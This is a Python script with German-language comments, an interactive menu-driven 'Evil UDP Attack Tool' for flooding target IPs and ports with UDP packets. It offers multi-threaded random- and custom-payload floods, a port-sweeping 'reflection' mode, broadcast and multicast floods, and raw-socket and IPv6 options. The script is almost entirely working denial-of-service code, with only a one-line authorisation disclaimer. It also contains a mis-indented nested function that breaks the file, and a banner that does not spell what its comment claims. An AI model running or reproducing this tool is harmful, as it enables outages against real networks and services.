#!/usr/bin/env python3
"""
Evil UDP Attack Tool
====================

Dieses Tool verwendet ausschließlich UDP, um diverse
Angriffsmethoden zu demonstrieren (Flood, Reflection, Broadcast,
Multicast u.v.m.). Es ist interaktiv, verfügt über erweiterte
Einstellungen und unterstützt IPv4/IPv6 sowie (sofern möglich) Raw Sockets.
Die Angriffe laufen so lange, bis sie manuell gestoppt werden.

Hinweis: Bitte nur auf Systemen einsetzen, für die Du autorisiert bist!
"""

import os
import sys
import socket
import threading
import random
import time
import platform
import queue
import struct

# =============================================
# Globale Variablen und Konfiguration
# =============================================
packet_counter = 0
stop_event = threading.Event()
log_queue = queue.Queue()  # Für thread-sichere Logs

# Konfigurationseinstellungen
config = {
    "max_packet_size": 65353,         # Maximale Paketgröße in Bytes
    "min_packet_size": 1,             # Minimale Paketgröße in Bytes
    "default_packet_size": 1024,      # Standard-Paketgröße
    "default_delay": 0.0,             # Verzögerung zwischen Paketen (Sekunden)
    "use_ipv6": False,                # Standard: IPv4
    "use_raw": False,                 # Raw Socket (benötigt Root)
    "socket_type": "UDP",             # Nur UDP verwendet
    "payload_mode": "random",         # "random" oder "custom"
    "custom_payload": None,           # Benutzerdefinierter Payload (Text)
    "random_payload_size": 1024,      # Größe des Zufallspayloads in Bytes
}

# =============================================
# Logger-Funktion und Hilfsfunktionen
# =============================================

def logger_thread():
    """
    Logger-Thread: Holt Nachrichten aus der globalen Queue und gibt sie aus.
    """
    while not stop_event.is_set():
        try:
            msg = log_queue.get(timeout=0.5)
            print(msg)
            log_queue.task_done()
        except queue.Empty:
            continue

def log(message):
    """
    Schreibt eine Nachricht in die Log-Queue.
    """
    log_queue.put(message)

# =============================================
# Banner und Systeminfo
# =============================================

def show_banner(color):
    """
    Zeigt das Banner im angegebenen Farbcode an.
    """
    os.system("clear")
    print(color)
    # ASCII-Art für "EVIL"
    print(r"""
  ______   _______  __    _  __   __  _______  __   __  _______ 
 |      | |       ||  |  | ||  | |  ||       ||  | |  ||       |
 |  _    ||    ___||   |_| ||  |_|  ||    ___||  |_|  ||  _____|
 | | |   ||   |___ |       ||       ||   |___ |       || |_____ 
 | |_|   ||    ___||  _    ||       ||    ___||_     _||_____  |
 |       ||   |___ | | |   ||   _   ||   |___   |   |   _____| |
 |______| |_______||_|  |__||__| |__||_______|  |___|  |_______|
    """)
    print("\033[0m")

def choose_color():
    """
    Ermöglicht dem Benutzer, eine Bannerfarbe auszuwählen.
    """
    print("Wähle eine Bannerfarbe:")
    print("1 - Rot")
    print("2 - Grün")
    print("3 - Blau")
    print("4 - Standard")
    choice = input("Deine Wahl: ")
    return {
        "1": "\033[91m",
        "2": "\033[92m",
        "3": "\033[94m",
        "4": "\033[0m",
    }.get(choice, "\033[0m")

def print_system_info():
    """
    Zeigt Systeminformationen an.
    """
    print("=== System Information ===")
    uname = platform.uname()
    print(f"System:    {uname.system}")
    print(f"Node:      {uname.node}")
    print(f"Release:   {uname.release}")
    print(f"Version:   {uname.version}")
    print(f"Machine:   {uname.machine}")
    print(f"Processor: {uname.processor}")
    print("==========================\n")

# =============================================
# Socket-Erstellung
# =============================================

def create_udp_socket():
    """
    Erzeugt und gibt einen UDP-Socket zurück.
    Unterstützt IPv4, IPv6 und (sofern konfiguriert) Raw-Sockets.
    """
    if config["use_raw"]:
        try:
            # Raw-Socket erfordert in der Regel Root-Rechte
            if config["use_ipv6"]:
                s = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_UDP)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            log("[INFO] Raw Socket erstellt (Root erforderlich)")
            return s
        except Exception as e:
            log(f"[ERROR] Fehler beim Erstellen des Raw Sockets: {e}")
            log("[INFO] Fallback auf Standard-UDP Socket")
    # Standard UDP-Socket
    if config["use_ipv6"]:
        s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return s

# =============================================
# Angriffsfunktionen (UDP Flood Varianten)
# =============================================

def udp_flood(ip, port, packet_size, delay):
    """
    Führt einen UDP Flood-Angriff mit zufälligem Payload durch.
    """
    global packet_counter
    s = create_udp_socket()
    while not stop_event.is_set():
        try:
            # Zielport: Falls -1, zufällige Portnummer wählen
            target_port = port if port != -1 else random.randint(1, 65535)
            # Payload erstellen (random oder custom)
            if config["payload_mode"] == "random":
                payload = os.urandom(packet_size)
            else:
                if config["custom_payload"]:
                    payload = (config["custom_payload"] * (packet_size // len(config["custom_payload"]) + 1))[:packet_size].encode('utf-8')
                else:
                    payload = os.urandom(packet_size)
            # Sende das UDP-Paket (IPv6 benötigt 4-Tupel)
            if config["use_ipv6"]:
                s.sendto(payload, (ip, target_port, 0, 0))
            else:
                s.sendto(payload, (ip, target_port))
            packet_counter += 1
            log(f"Gesendet {packet_counter} UDP-Pakete an {ip}:{target_port} mit {packet_size} Bytes")
            if delay > 0:
                time.sleep(delay)
        except Exception as e:
            log(f"[ERROR] UDP Fehler: {e}")
    s.close()

def udp_custom_attack(ip, port, custom_payload, packet_size, delay):
    """
    Führt einen UDP Flood-Angriff mit einem benutzerdefinierten Payload durch.
    Der Payload wird wiederholt, um die gewünschte Paketgröße zu erreichen.
    """
    global packet_counter
    s = create_udp_socket()
    try:
        base_payload = str(custom_payload)
    except Exception:
        base_payload = "x"
    full_payload = (base_payload * (packet_size // len(base_payload) + 1))[:packet_size].encode('utf-8')
    while not stop_event.is_set():
        try:
            target_port = port if port != -1 else random.randint(1, 65535)
            if config["use_ipv6"]:
                s.sendto(full_payload, (ip, target_port, 0, 0))
            else:
                s.sendto(full_payload, (ip, target_port))
            packet_counter += 1
            log(f"Gesendet {packet_counter} benutzerdefinierte UDP-Pakete an {ip}:{target_port} mit {packet_size} Bytes")
            if delay > 0:
                time.sleep(delay)
        except Exception as e:
            log(f"[ERROR] Custom UDP Fehler: {e}")
    s.close()

def udp_reflection_attack(ip, port, packet_size, delay):
    """
    Simuliert einen UDP Reflection-Angriff, indem Pakete an Ports 1-1023 gesendet werden.
    """
    global packet_counter
    s = create_udp_socket()
    while not stop_event.is_set():
        try:
            for target_port in range(1, 1024):
                if stop_event.is_set():
                    break
                if config["payload_mode"] == "random":
                    payload = os.urandom(packet_size)
                else:
                    if config["custom_payload"]:
                        payload = (config["custom_payload"] * (packet_size // len(config["custom_payload"]) + 1))[:packet_size].encode('utf-8')
                    else:
                        payload = os.urandom(packet_size)
                if config["use_ipv6"]:
                    s.sendto(payload, (ip, target_port, 0, 0))
                else:
                    s.sendto(payload, (ip, target_port))
                packet_counter += 1
                log(f"Reflection: Gesendet {packet_counter} UDP-Pakete an {ip}:{target_port}")
                if delay > 0:
                    time.sleep(delay)
        except Exception as e:
            log(f"[ERROR] Reflection UDP Fehler: {e}")
    s.close()

def udp_broadcast_attack(ip, port, packet_size, delay):
    """
    Führt einen UDP Broadcast-Angriff durch, indem Pakete an die Broadcast-Adresse gesendet werden.
    """
    global packet_counter
    s = create_udp_socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    broadcast_address = '<broadcast>'
    while not stop_event.is_set():
        try:
            if config["payload_mode"] == "random":
                payload = os.urandom(packet_size)
            else:
                if config["custom_payload"]:
                    payload = (config["custom_payload"] * (packet_size // len(config["custom_payload"]) + 1))[:packet_size].encode('utf-8')
                else:
                    payload = os.urandom(packet_size)
            s.sendto(payload, (broadcast_address, port))
            packet_counter += 1
            log(f"Broadcast: Gesendet {packet_counter} UDP-Pakete an {broadcast_address}:{port}")
            if delay > 0:
                time.sleep(delay)
        except Exception as e:
            log(f"[ERROR] Broadcast UDP Fehler: {e}")
    s.close()

def udp_multicast_attack(ip, port, packet_size, delay):
    """
    Führt einen UDP Multicast-Angriff durch, indem Pakete an eine Multicast-Gruppe gesendet werden.
    """
    global packet_counter
    s = create_udp_socket()
    multicast_group = ip  # ip sollte eine gültige Multicast-Adresse sein
    ttl = struct.pack('b', 1)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl)
    while not stop_event.is_set():
        try:
            if config["payload_mode"] == "random":
                payload = os.urandom(packet_size)
            else:
                if config["custom_payload"]:
                    payload = (config["custom_payload"] * (packet_size // len(config["custom_payload"]) + 1))[:packet_size].encode('utf-8')
                else:
                    payload = os.urandom(packet_size)
            s.sendto(payload, (multicast_group, port))
            packet_counter += 1
            log(f"Multicast: Gesendet {packet_counter} UDP-Pakete an {multicast_group}:{port}")
            if delay > 0:
                time.sleep(delay)
        except Exception as e:
            log(f"[ERROR] Multicast UDP Fehler: {e}")
    s.close()

# =============================================
# Erweiterte Einstellungen und Hilfsmenüs
# =============================================

def advanced_settings_menu():
    """
    Zeigt das Menü für erweiterte Einstellungen.
    """
    print("\n=== Erweiterte Einstellungen ===")
    print(f"1. Paketgröße (Bytes) [Min: {config['min_packet_size']}, Max: {config['max_packet_size']}, Aktuell: {config.get('default_packet_size')}]")
    print("2. Verzögerung zwischen Paketen (Sekunden) [Aktuell: {:.4f}]".format(config.get("default_delay")))
    print("3. Payload Modus (random/custom) [Aktuell: {}]".format(config.get("payload_mode")))
    print("4. Benutzerdefinierter Payload (falls custom ausgewählt) [Aktuell: {}]".format(config.get("custom_payload")))
    print("5. Zufällige Payload Größe (für random) [Aktuell: {} Bytes]".format(config.get("random_payload_size")))
    print("6. IPv6 Modus (ja/nein) [Aktuell: {}]".format("ja" if config.get("use_ipv6") else "nein"))
    print("7. Raw Socket Modus (ja/nein, benötigt Root) [Aktuell: {}]".format("ja" if config.get("use_raw") else "nein"))
    print("8. Zurück zum Hauptmenü")
    choice = input("Wähle eine Option (1-8): ")
    
    if choice == "1":
        new_size = input(f"Gib die Paketgröße in Bytes ein (Min {config['min_packet_size']}, Max {config['max_packet_size']}): ")
        try:
            new_size = int(new_size)
            if config['min_packet_size'] <= new_size <= config['max_packet_size']:
                config['default_packet_size'] = new_size
                print(f"Paketgröße aktualisiert auf {new_size} Bytes.")
            else:
                print("Ungültiger Wert. Wert muss zwischen den angegebenen Grenzen liegen.")
        except ValueError:
            print("Ungültige Eingabe.")
    elif choice == "2":
        new_delay = input("Gib die Verzögerung zwischen Paketen in Sekunden ein (z.B. 0.0 für keine Verzögerung): ")
        try:
            new_delay = float(new_delay)
            config['default_delay'] = new_delay
            print(f"Verzögerung aktualisiert auf {new_delay} Sekunden.")
        except ValueError:
            print("Ungültige Eingabe.")
    elif choice == "3":
        new_mode = input("Wähle den Payload Modus ('random' oder 'custom'): ").strip().lower()
        if new_mode in ["random", "custom"]:
            config['payload_mode'] = new_mode
            print(f"Payload Modus aktualisiert auf {new_mode}.")
        else:
            print("Ungültiger Modus.")
    elif choice == "4":
        new_payload = input("Gib den benutzerdefinierten Payload ein (Text): ")
        config['custom_payload'] = new_payload
        print("Benutzerdefinierter Payload aktualisiert.")
    elif choice == "5":
        new_rand_size = input("Gib die Größe für den zufälligen Payload in Bytes ein: ")
        try:
            new_rand_size = int(new_rand_size)
            if config['min_packet_size'] <= new_rand_size <= config['max_packet_size']:
                config['random_payload_size'] = new_rand_size
                print(f"Zufällige Payload Größe aktualisiert auf {new_rand_size} Bytes.")
            else:
                print("Ungültiger Wert.")
        except ValueError:
            print("Ungültige Eingabe.")
    elif choice == "6":
        new_ipv6 = input("IPv6 Modus aktivieren? (ja/nein): ").strip().lower()
        config['use_ipv6'] = True if new_ipv6.startswith('j') else False
        print("IPv6 Modus aktualisiert.")
    elif choice == "7":
        new_raw = input("Raw Socket Modus aktivieren? (ja/nein, benötigt Root): ").strip().lower()
        config['use_raw'] = True if new_raw.startswith('j') else False
        print("Raw Socket Modus aktualisiert.")
    elif choice == "8":
        return
    else:
        print("Ungültige Option.")
    input("Drücke ENTER, um fortzufahren...")
    advanced_settings_menu()

def network_protocol_switch_menu():
    """
    Menü zum Wechseln der Netzwerkprotokoll-Einstellungen.
    """
    print("\n=== Netzwerk Protokoll Einstellungen ===")
    print("1. Standard UDP (IPv4)")
    print("2. UDP (IPv6)")
    print("3. Raw Socket UDP (benötigt Root)")
    print("4. Zurück zum Hauptmenü")
    choice = input("Wähle eine Option (1-4): ")
    
    if choice == "1":
        config["use_ipv6"] = False
        config["use_raw"] = False
        print("Eingestellt auf Standard UDP (IPv4).")
    elif choice == "2":
        config["use_ipv6"] = True
        config["use_raw"] = False
        print("Eingestellt auf UDP (IPv6).")
    elif choice == "3":
        config["use_raw"] = True
        print("Eingestellt auf Raw Socket UDP (Root erforderlich).")
    elif choice == "4":
        return
    else:
        print("Ungültige Option.")
    input("Drücke ENTER, um fortzufahren...")
    network_protocol_switch_menu()

# =============================================
# Zusätzliche Funktionen zur Demonstration
# =============================================

def dummy_function():
    """
    Dummy-Funktion, um die Kommunikation zwischen Codezeilen zu demonstrieren.
    Diese Funktion dient als Platzhalter, damit sich einzelne Module „hören“.
    """
    log("Dummy Funktion aktiviert.")
    time.sleep(0.1)
    log("Dummy Funktion abgeschlossen.")

def extra_udp_feature():
    """
    Zusätzliche UDP-Funktion, die weitere Einstellungen und
    Interaktionen zwischen Threads demonstriert.
    """
    log("Extra UDP Feature gestartet.")
    for i in range(5):
        if stop_event.is_set():
            break
        log(f"Extra Feature: Runde {i+1}")
        time.sleep(0.2)
    log("Extra UDP Feature beendet.")

def inter_thread_communication():
    """
    Demonstriert die Kommunikation zwischen verschiedenen Threads.
    Ruft dummy_function und extra_udp_feature in separaten Threads auf.
    """
    thread1 = threading.Thread(target=dummy_function)
    thread2 = threading.Thread(target=extra_udp_feature)
    thread1.start()
    thread2.start()
    thread1.join()
    thread2.join()
    log("Inter-Thread Kommunikation abgeschlossen.")

def extra_feature_menu():
    """
    Menü für zusätzliche UDP-Funktionen.
    """
    print("\n=== Zusätzliche UDP Funktionen ===")
    print("1. Dummy Funktion ausführen")
    print("2. Inter-Thread Kommunikation testen")
    print("3. Zurück zum Hauptmenü")
    choice = input("Wähle eine Option (1-3): ")
    if choice == "1":
        dummy_function()
    elif choice == "2":
        inter_thread_communication()
    elif choice == "3":
        return
    else:
        print("Ungültige Option.")
    input("Drücke ENTER, um fortzufahren...")
    extra_feature_menu()

# =============================================
# Hauptmenüs
# =============================================

def main_menu():
    """
    Hauptmenü für die Angriffsauswahl.
    """
    while True:
        os.system("clear")
        banner_color = choose_color()
        show_banner(banner_color)
        print("=== Evil UDP Attack Tool ===\n")
        print("1. Starte UDP Flood Attack (Standard Random Payload)")
        print("2. Starte UDP Flood Attack (Benutzerdefinierter Payload)")
        print("3. Starte UDP Reflection Attack (Ports 1-1023)")
        print("4. Erweiterte Einstellungen")
        print("5. Systeminformationen anzeigen")
        print("6. Beenden")
        choice = input("Wähle eine Option (1-6): ")
        
        if choice in ["1", "2", "3"]:
            target_ip = input("Ziel-IP-Adresse: ").strip()
            target_port_input = input("Ziel-Port (oder -1 für zufällige Ports): ").strip()
            try:
                target_port = int(target_port_input)
            except ValueError:
                print("Ungültiger Port. Standardwert -1 wird verwendet.")
                target_port = -1
            if config["use_ipv6"]:
                print("IPv6 Modus ist aktiviert. Achte auf eine gültige IPv6 Adresse.")
            
            target_mac = input("Ziel-MAC-Adresse (optional): ").strip()
            print("\nAngriff startet... Drücke ENTER, um den Angriff zu stoppen.\n")
            
            threads_input = input("Anzahl der Threads (z.B. 10): ").strip()
            try:
                num_threads = int(threads_input)
            except ValueError:
                print("Ungültige Eingabe. Standardwert 10 wird verwendet.")
                num_threads = 10
            
            packet_size_input = input(f"Paketgröße in Bytes (Min {config['min_packet_size']}, Max {config['max_packet_size']}, Standard {config['default_packet_size']}): ").strip()
            try:
                packet_size = int(packet_size_input)
                if packet_size < config['min_packet_size'] or packet_size > config['max_packet_size']:
                    print("Paketgröße außerhalb der Grenzen. Standardwert wird verwendet.")
                    packet_size = config['default_packet_size']
            except ValueError:
                print("Ungültige Eingabe. Standardwert wird verwendet.")
                packet_size = config['default_packet_size']
            
            delay_input = input("Verzögerung zwischen Paketen in Sekunden (z.B. 0.0 für keine Verzögerung): ").strip()
            try:
                delay = float(delay_input)
            except ValueError:
                print("Ungültige Eingabe. Standardwert 0.0 wird verwendet.")
                delay = config['default_delay']
            
            log_thread = threading.Thread(target=logger_thread)
            log_thread.daemon = True
            log_thread.start()
            
            threads = []
            if choice == "1":
                config['payload_mode'] = "random"
                for _ in range(num_threads):
                    t = threading.Thread(target=udp_flood, args=(target_ip, target_port, packet_size, delay))
                    t.daemon = True
                    threads.append(t)
                    t.start()
            elif choice == "2":
                config['payload_mode'] = "custom"
                if not config.get("custom_payload"):
                    custom_payload_input = input("Gib den benutzerdefinierten Payload ein (Text): ")
                    config['custom_payload'] = custom_payload_input
                for _ in range(num_threads):
                    t = threading.Thread(target=udp_custom_attack, args=(target_ip, target_port, config['custom_payload'], packet_size, delay))
                    t.daemon = True
                    threads.append(t)
                    t.start()
            elif choice == "3":
                config['payload_mode'] = "random"
                for _ in range(num_threads):
                    t = threading.Thread(target=udp_reflection_attack, args=(target_ip, target_port, packet_size, delay))
                    t.daemon = True
                    threads.append(t)
                    t.start()
            
            input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen...\n")
            stop_event.set()
            for t in threads:
                t.join()
            log("[INFO] Angriff gestoppt.")
            stop_event.clear()
            global packet_counter
            packet_counter = 0
            input("Drücke ENTER, um zum Hauptmenü zurückzukehren...")
        elif choice == "4":
            advanced_settings_menu()
        elif choice == "5":
            print_system_info()
            input("Drücke ENTER, um zum Hauptmenü zurückzukehren...")
        elif choice == "6":
            print("Programm wird beendet.")
            stop_event.set()
            sys.exit(0)
        else:
            print("Ungültige Option. Bitte versuche es erneut.")
            time.sleep(2)
            def extended_main_menu():
    """
    Erweiterte Version des Hauptmenüs, das zusätzliche Funktionen bietet.
    """
    while True:
        os.system("clear")
        print("=== Evil UDP Attack Tool - Erweiterte Version ===\n")
        print("1. Hauptangriff (UDP Flood)")
        print("2. Erweiterte UDP Funktionen")
        print("3. Netzwerk Protokoll Einstellungen")
        print("4. Erweiterte Einstellungen")
        print("5. Systeminformationen anzeigen")
        print("6. Beenden")
        choice = input("Wähle eine Option (1-6): ")
        if choice == "1":
            main_menu()
        elif choice == "2":
            extra_feature_menu()
        elif choice == "3":
            network_protocol_switch_menu()
        elif choice == "4":
            advanced_settings_menu()
        elif choice == "5":
            print_system_info()
            input("Drücke ENTER, um zum Menü zurückzukehren...")
        elif choice == "6":
            print("Programm wird beendet.")
            stop_event.set()
            sys.exit(0)
        else:
            print("Ungültige Option. Bitte versuche es erneut.")
            time.sleep(2)

# =============================================
# Hauptprogramm
# =============================================

def main():
    """
    Hauptfunktion zum Starten des Evil UDP Attack Tools.
    """
    try:
        while True:
            os.system("clear")
            print("=== Evil UDP Attack Tool ===")
            print("1. Hauptmenü")
            print("2. Netzwerk Protokoll Einstellungen")
            print("3. Beenden")
            main_choice = input("Wähle eine Option (1-3): ")
            if main_choice == "1":
                main_menu()
            elif main_choice == "2":
                network_protocol_switch_menu()
            elif main_choice == "3":
                print("Programm wird beendet.")
                stop_event.set()
                sys.exit(0)
            else:
                print("Ungültige Option. Bitte versuche es erneut.")
                time.sleep(2)
    except KeyboardInterrupt:
        stop_event.set()
        print("\n[INFO] Angriff abgebrochen. Programm beendet.")
        sys.exit(0)
# =============================================
# Programmstart
# =============================================

if __name__ == "__main__":
    main()
        
